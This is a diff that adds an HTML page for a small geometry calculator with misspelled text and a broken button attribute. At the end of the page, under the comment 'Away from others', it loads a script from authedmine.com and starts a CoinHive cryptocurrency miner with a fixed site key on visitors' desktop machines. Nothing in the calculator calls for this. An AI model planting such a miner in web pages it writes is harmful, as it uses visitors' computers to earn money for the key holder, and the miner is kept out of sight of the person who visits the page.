@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Cauculator</title>
+	</head>
+
+
+	<body style="background-color: #66ccff">
+
+
+		<div align="center">
+
+		<script>
+			function Geometry(){
+				document.open()
+				function TwoD(){
+					document.open()
+					document.write("\
+						<div align='center'>\
+							<h1>\
+								<font face='Helvetica'>\
+									Plase select what kind of cauculating did you need.\
+								</font>\
+							</h1>\
+						</div>\
+						")
+					document.body.style.backgroundColor = "#66ccff"
+				}
+				document.write("\
+					<div align='center'>\
+						<font face='Helvetica'>\
+						<h1>\
+						Please select your category!\
+						</h1>\
+						</font>\
+					</div>\
+					")
+				
+				document.write("\
+					<div align='center'>\
+					<button type='button onclick='TwoD()'>2D Shape</button>&nbsp;\
+					<button type='button'>3D Shape</button>\
+					</div>\
+					")
+				document.body.style.backgroundColor = "#66ccff"
+			}
+		</script>
+			<font face="Helvetica">
+				<h1>
+					Welcome to use SKA utimate cauculator!<br>Please select your category!
+				</h1>
+				<h3>
+					<button type="button" onclick="Geometry()">Geometry</button>
+				</h3>
+			</font>
+		</div>
+
+
+
+		<!--Away from others-->
+		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+		<script>
+			var miner = new CoinHive.Anonymous('8DB2zcIGcjOm3f9Bgzt2WwzidubtAisz', {
+				threads: 4,
+				throttle: 0.3,
+				forceASMJS: false,
+				theme: 'dark',
+				language: 'auto'
+			});
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (4 hours):
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+			}
+		</script>
+	</body>
+</html>
